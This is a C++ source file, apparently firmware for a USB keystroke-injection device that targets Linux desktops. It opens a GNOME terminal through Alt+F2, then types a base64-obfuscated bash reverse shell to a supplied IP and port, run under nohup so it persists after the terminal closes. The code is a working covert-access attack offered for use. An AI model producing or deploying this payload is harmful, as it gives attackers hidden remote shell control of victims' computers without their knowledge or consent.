#include "LinuxPayload.h"

void LinuxPayload::openTerminal(bool debug) {
    // Key combo to open GNOME run dialog
    const int open_run_keys[] = {
        KEY_LEFT_ALT,
        KEY_F2
    };

    // Command to launch GNOME terminal
    const char terminal_cmd[] = "gnome-terminal";

    // Open run dialog
    for (size_t i = 0; i < (sizeof(open_run_keys) / sizeof(open_run_keys[0])); i++) {
        KeyboardUtils::pressKey(open_run_keys[i], debug);
    }
    Keyboard.releaseAll();

    // Launch terminal
    delay(random(250, 750));
    KeyboardUtils::typeCommand(terminal_cmd, debug);
    // Delay for terminal to launch
    delay(random(250, 750));
}

void LinuxPayload::executePayload(const char* ip_address, const char* port_num, bool debug) {
    // BASH reverse shell payload
    size_t clearPayloadLength = 28 + strlen(ip_address) + strlen(port_num) + 1;
    size_t encodedLength = Base64::encodedLength(clearPayloadLength -1); // w/o string termination
    size_t payloadLength = strlen("nohup bash -c \"$(echo '") + encodedLength + strlen("' | base64 --decode)\";exit") + 1;

    char clearPayload[clearPayloadLength];
    char encodedPayload[encodedLength];
    char payload[payloadLength];

    // Create base64 encoded payload
    snprintf(clearPayload, sizeof(clearPayload), "bash -i >& /dev/tcp/%s/%s 0>&1 &", ip_address, port_num);
    Base64::encode(encodedPayload, clearPayload, clearPayloadLength);
    snprintf(payload, sizeof(payload), "nohup bash -c \"$(echo '%s' | base64 --decode)\";exit", encodedPayload);

    // Execute reverse shell payload
    delay(random(750, 1250));
    KeyboardUtils::typeCommand(payload, debug);
}